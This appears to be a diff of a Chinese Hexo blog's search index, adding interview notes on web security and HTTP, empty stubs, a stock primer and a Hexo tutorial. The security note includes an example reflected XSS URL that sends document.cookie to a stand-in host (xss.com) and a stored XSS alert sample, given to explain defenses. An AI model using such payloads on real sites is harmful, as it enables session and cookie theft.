@@ -4,12 +4,197 @@
   
     
     <entry>
+      <title>安全相关</title>
+      <link href="/post/interview/security/"/>
+      <url>/post/interview/security/</url>
+      
+        <content type="html"><![CDATA[<h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h1><ol><li><p>Reflected XSS（基于反射的XSS攻击）<br>主要通过利用系统反馈行为漏洞，并欺骗用户主动触发，从而发起Web攻击。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://you.163.com/search?keyword=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://xss.com/get?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果受骗的用户刚好已经登录过该网站，那么，用户的登录cookie信息就已经发到了攻击者的服务器（<em>xss.com</em>）了。当然，攻击者会做一些更过分的操作。</p></li></ol><p><img src="https://pics-1300486997.cos.ap-chengdu.myqcloud.com/image-20240319141647511.png?imageSlim" alt="image-20240319141647511"></p><ol start="2"><li><p>Stored XSS（基于存储的XSS攻击）</p><p>Stored XSS和Reflected XSS的差别就在于，具有攻击性的脚本被保存到了服务器并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。</p><p><code>你好！当你看到这段文字时，你的信息已经不安全了！&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><blockquote><p>tips：文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。<br>此为题多从在于博客网站。</p></blockquote></li></ol><p><img src="https://pics-1300486997.cos.ap-chengdu.myqcloud.com/image-20240319141705691.png?imageSlim" alt="image-20240319141705691"></p><ol start="3"><li><p>DOM-based or local XSS（基于DOM或本地的XSS攻击）</p><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p><p>document.referer属性<br>window.name属性<br>location属性<br>innerHTML属性<br>documen.write属性<br>······</p></li></ol><p>对于一切用户的输入、输出、客户端的输出内容视为不可信，在数据添加到DOM或者执行了DOM API的时候，我们需要对内容进行HtmlEncode或JavaScriptEncode，以预防XSS攻击。 <a href="https://www.cnblogs.com/lovesong/p/5211667.html">https://www.cnblogs.com/lovesong/p/5211667.html</a></p><h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><blockquote><p>跨站请求伪造 CSRF（Cross-site request forgery），也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。但往往同XSS一同作案！</p></blockquote><ol><li><p>登录受信任网站A，并在本地生成Cookie。</p></li><li><p>在不登出A的情况下，访问危险网站B。</p></li><li><p>验证 HTTP Referer 字段；</p><p>利用HTTP头中的Referer判断请求来源是否合法。</p><p>优点：简单易行，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p><p>缺点：<br>1、Referer 的值是由浏览器提供的，不可全信，低版本浏览器下Referer存在伪造风险。<br>2、用户自己可以设置浏览器使其在发送请求时不再提供 Referer时，网站将拒绝合法用户的访问。</p></li><li><p>在请求地址中添加 token 并验证；</p><p>在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中，以HTTP请求参数的形式加入一个随机产生的 token交由服务端验证</p><p>优点：比检查 Referer 要安全一些，并且不涉及用户隐私。<br>缺点：对所有请求都添加token比较困难，难以保证 token 本身的安全，依然会被利用获取到token</p></li><li><p>在 HTTP 头中自定义属性并验证</p><p>将token放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 的异步请求交由后端校验，并且一次有效。</p><p>优点：统一管理token输入输出，可以保证token的安全性<br>缺点：有局限性，无法在非异步的请求上实施</p></li></ol><h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><pre><code> 点击劫持，英文名clickjacking，也叫UI覆盖攻击，攻击者会利用一个或多个透明或不透明的层来诱骗用户支持点击按钮的操作，而实际的点击确实用户看不到的一个按钮，从而达到在用户不知情的情况下实施攻击。</code></pre><p>防止点击劫持有两种主要方法：</p><h3 id="X-FRAME-OPTIONS"><a href="#X-FRAME-OPTIONS" class="headerlink" title="X-FRAME-OPTIONS"></a>X-FRAME-OPTIONS</h3><p>X-FRAME-OPTIONS是微软提出的一个http头，指示浏览器不允许从其他域进行取景，专门用来防御利用iframe嵌套的点击劫持攻击。并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。<br>这个头有三个值：<br>DENY &#x2F;&#x2F; 拒绝任何域加载<br>SAMEORIGIN &#x2F;&#x2F; 允许同源域下加载<br>ALLOW-FROM &#x2F;&#x2F; 可以定义允许frame加载的页面地址</p><h3 id="顶层判断"><a href="#顶层判断" class="headerlink" title="顶层判断"></a>顶层判断</h3><p>在UI中采用防御性代码，以确保当前帧是最顶层的窗口<br>方法有多中，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top != self || top.location != self.location || top.location != location复制代码</span><br></pre></td></tr></table></figure><p>有关Clickjacking防御的更多信息，请参阅<a href="https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet">Clickjacking Defense Cheat Sheet</a>.</p><p>参考来源： <a href="https://juejin.cn/post/6844903504369172494#heading-20">https://juejin.cn/post/6844903504369172494#heading-20</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>http相关</title>
+      <link href="/interview/interview/http/"/>
+      <url>/interview/interview/http/</url>
+      
+        <content type="html"><![CDATA[<h3 id="HTTP1-0"><a href="#HTTP1-0" class="headerlink" title="HTTP1.0"></a>HTTP1.0</h3><p> HTTP&#x2F;1.0是无状态、无连接的应用层协议</p><p>每一次请求都需要建立一个TCP链接，服务器处理完之后立即断开连接</p><p><img src="https://pics-1300486997.cos.ap-chengdu.myqcloud.com/image-20240319140802233.png?imageSlim" alt="image-20240319140802233"></p><p>通过cookie&#x2F;session等进行身份认证</p><h3 id="HTTP1-0-存在问题"><a href="#HTTP1-0-存在问题" class="headerlink" title="HTTP1.0 存在问题"></a>HTTP1.0 存在问题</h3><h4 id="无法复用"><a href="#无法复用" class="headerlink" title="无法复用"></a>无法复用</h4><p>每次发送请求，都需要进行一次tcp连接，tcp的连接释放过程比较费时，无连接的特性会是的</p><h4 id="队头阻塞"><a href="#队头阻塞" class="headerlink" title="队头阻塞"></a>队头阻塞</h4><p>HTTP1.0规定下一个请求必须在前一个请求响应到达之后才能发送2</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> interview </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>浏览器相关</title>
+      <link href="/interview/interview/brower/"/>
+      <url>/interview/interview/brower/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> interview </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>vue</title>
+      <link href="/interview/interview/vue/"/>
+      <url>/interview/interview/vue/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> interview </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>css</title>
+      <link href="/interview/interview/css/"/>
+      <url>/interview/interview/css/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> interview </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>react</title>
+      <link href="/interview/interview/react/"/>
+      <url>/interview/interview/react/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> interview </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>html</title>
+      <link href="/interview/interview/html/"/>
+      <url>/interview/interview/html/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> interview </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>js面试相关</title>
+      <link href="/interview/interview/js/"/>
+      <url>/interview/interview/js/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> interview </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> interview </tag>
+            
+            <tag> frontend </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>股票入门</title>
+      <link href="/stock/stock/stock/"/>
+      <url>/stock/stock/stock/</url>
+      
+        <content type="html"><![CDATA[<h3 id="小白入门"><a href="#小白入门" class="headerlink" title="小白入门"></a>小白入门</h3><h4 id="国债逆回购"><a href="#国债逆回购" class="headerlink" title="国债逆回购"></a><strong>国债逆回购</strong></h4><p>正回购方(资金融入方)在将债券出质给逆回购方(资金融出方)融入资金的同时，双方约定在将来某一指定日期，由正回购方按约定回购利率计算的资金额向逆回购方返回资金，逆回购方向正回购方返回原出质债券的融资行为。</p><p>通俗来说，<strong>有资金的一方（逆回购方）</strong>将钱融给需要资金的一方（<strong>正回购方</strong>，他需要质押债券才可以融资），到期向正回购方收取一定的利息。</p><p>在<strong>月末</strong>，<strong>季末</strong>，<strong>长假</strong>之前，收益率有可能会大幅提高</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> stock </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 股票 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>hexo入门 &amp; butterfly魔改</title>
-      <link href="/post/hexo%E5%85%A5%E9%97%A8/"/>
-      <url>/post/hexo%E5%85%A5%E9%97%A8/</url>
+      <link href="/hexo/hexo%E5%85%A5%E9%97%A8/"/>
+      <url>/hexo/hexo%E5%85%A5%E9%97%A8/</url>
       
         <content type="html"><![CDATA[<h3 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &lt;titie&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>布局</th><th>路径</th></tr></thead><tbody><tr><td>post</td><td>source&#x2F;_posts</td></tr><tr><td>page</td><td>source</td></tr><tr><td>draft</td><td>source&#x2F;_drafts</td></tr></tbody></table><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-p</td><td>–path 自定义新文章路径</td></tr><tr><td>-r</td><td>–replace如果存在同名文章，将其替换</td></tr><tr><td>-s</td><td>–slug文章的 Slug，作为新文章的文件名和发布后的 URL</td></tr></tbody></table><p>新建文件默认地址： 2024&#x2F;03&#x2F;18&#x2F;hexo入门&#x2F;<br>permalink：<br>2024&#x2F;03&#x2F;18&#x2F;hexo入门&#x2F;</p><h3 id="butterfly添加自定义js、css文件"><a href="#butterfly添加自定义js、css文件" class="headerlink" title="butterfly添加自定义js、css文件"></a>butterfly添加自定义js、css文件</h3><p>推荐在根目录的<code>source</code>文件夹种配置，通过配置文件将<br>  <img src="/img/hexo/file.png" alt="展示目录"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">_config.butterfly.yml</span> </span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    # - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;script src=&quot;/js/browsersync.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="实时编辑预览"><a href="#实时编辑预览" class="headerlink" title="实时编辑预览"></a>实时编辑预览</h3><p>当通过<code>hexo s</code>开启本地调试后，预览页面无法实现实时更新<br>可通过<a href="https://github.com/hexojs/hexo-browsersync/">hexo-browsersync</a>配置, 3001端口对应brosersync配置页，根据配置页提示将对应代码块复制到<code>/public/index.html</code>文件<body>代码块内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-browsersync --save</span><br><span class="line">hexo s</span><br><span class="line">[Browsersync] Access URLs:</span><br><span class="line"> ----------------------------------</span><br><span class="line">          UI: http://localhost:3001</span><br><span class="line"> ----------------------------------</span><br><span class="line"> UI External: http://localhost:3001</span><br><span class="line"> ----------------------------------</span><br><span class="line">INFO  Hexo is running at http://localhost:4000/ . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure><p>参考链接: <a href="https://blog.mutoe.com/2016/hexo-post-livereload-edit/#Hexo-Browsersync-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">Hexo-Browsersync-使用方法</a><br>| yml文件改动后还是需要重新启动以生效</p><h3 id="本地搜索功能"><a href="#本地搜索功能" class="headerlink" title="本地搜索功能"></a>本地搜索功能</h3><p>通过<a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a>实现本地搜索，</p><h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><h4 id="注入配置-config-yml文件"><a href="#注入配置-config-yml文件" class="headerlink" title="注入配置 _config.yml文件"></a>注入配置 _config.yml文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  content: true</span><br></pre></td></tr></table></figure><h4 id="butterfly主题开启搜索功能-config-butterfly-yml文件"><a href="#butterfly主题开启搜索功能-config-butterfly-yml文件" class="headerlink" title="butterfly主题开启搜索功能 _config.butterfly.yml文件"></a>butterfly主题开启搜索功能 _config.butterfly.yml文件</h4><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">local_search:</span><br><span class="line"><span class="deletion">-  enable: false</span></span><br><span class="line"><span class="addition">+  enable: true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="图库"><a href="#图库" class="headerlink" title="图库"></a>图库</h3><p>图库页面是普通的页面，通过<code>hexo n page xxxxx</code>创建后使用标签外挂<a href="https://butterfly.js.org/posts/4aa8abbe/#Gallery%E7%9B%B8%E5%86%8A%E5%9C%96%E5%BA%AB">galleryGroup</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span><br><span class="line">&#123;% galleryGroup &#x27;壁紙&#x27; &#x27;收藏的一些壁紙&#x27; &#x27;/Gallery/wallpaper&#x27; https://i.loli.net/2019/11/10/T7Mu8Aod3egmC4Q.png %&#125;</span><br><span class="line">&#123;% galleryGroup &#x27;漫威&#x27; &#x27;關於漫威的圖片&#x27; &#x27;/Gallery/marvel&#x27; https://i.loli.net/2019/12/25/8t97aVlp4hgyBGu.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup &#x27;OH MY GIRL&#x27; &#x27;關於OH MY GIRL的圖片&#x27; &#x27;/Gallery/ohmygirl&#x27; https://i.loli.net/2019/12/25/hOqbQ3BIwa6KWpo.jpg %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="gallery-group-main"><figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://i.loli.net/2019/11/10/T7Mu8Aod3egmC4Q.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">壁紙</div>  <p>收藏的一些壁紙</p>  <a href='/Gallery/wallpaper'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://i.loli.net/2019/12/25/8t97aVlp4hgyBGu.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">漫威</div>  <p>關於漫威的圖片</p>  <a href='/Gallery/marvel'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://i.loli.net/2019/12/25/hOqbQ3BIwa6KWpo.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">OH MY GIRL</div>  <p>關於OH MY GIRL的圖片</p>  <a href='/Gallery/ohmygirl'></a>  </figcaption>  </figure>  </div>]]></content>
       
+      
+      <categories>
+          
+          <category> hexo </category>
+          
+      </categories>
       
       
         <tags>
